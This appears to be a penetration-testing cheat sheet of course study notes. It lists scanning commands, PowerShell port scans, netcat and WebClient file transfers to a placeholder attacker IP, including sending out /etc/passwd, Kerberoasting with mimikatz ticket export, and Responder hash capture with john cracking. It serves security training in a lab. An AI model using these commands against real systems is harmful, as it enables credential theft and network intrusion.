# Chapter 1  Scope and Recon

strings -n 8 for different encoding types -e l for little endian b for big endian

```
strings -n 8 -e b WidgetStatisticalWhitepaper.doc | grep '\\'
```
```
exfiltool
```



# Chapter 2 Scanning

## Nmap

## Other Scanning tools   
```
masscan -0-65535 --rate 1500 10.10.10.0/24
```
```
tcpdump -nnX tcp and dst 10.10.10.10
tcpdump -nn udp and src 10.10.10.10
tcpdump -nn tcp and port 80 and host 10.10.10.10
```
```
echo "" | nc -nvw2 10.10.10.60 20-80
```

### Powershell commands

#### Ping scan

```
1..60 | % { echo $_; ping -n 1 -w 100 10.10.10.$_ | select-string ttl }
```
#### Port scan

```
70..90 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50", $_)) "Port $_ is open" } 2>$null
```
#### Transfer files

```
(New-Object System.Net.WebClient).DownloadFile("http://YOUR_LINUX_IP_ADDRESS/SEC560/netcat.zip","netcat.zip")
```


### IPv6 scans

multicast scan   
```
ping6 -I eth0 ff02::1
```   
### Netcat

Transfer files
```
nc -nvlp 8080 < /etc/passwd

nc -nv YOUR_LINUX_IP_ADDRESS 8080 > passwd.txt
```

# Chapter 5

## Kerberoasting

```
cscript.exe GetUserSPNs.vbs
```
```
powershell.exe -command "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'svcsqlserver/dc01.sec560.local:1433'"
```

```
mimikatz.exe
mimikatz # kerberos::list /export
mimikatz # exit
```

Look for `rc4_hmac_nt`

Crack ticket with tgsrepcrack.py from TIM Medin `https://github.com/nidem/kerberoast`

```
python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi
```

## Responder

```
Responder.py -I eth0
```

saved hashes will be put in `/opt/responder/logs` or whereever responder is stored

`SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADDRESS.txt`

```
john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADDRESS.txt
```

passwords saved in `~/.john/john.pot`
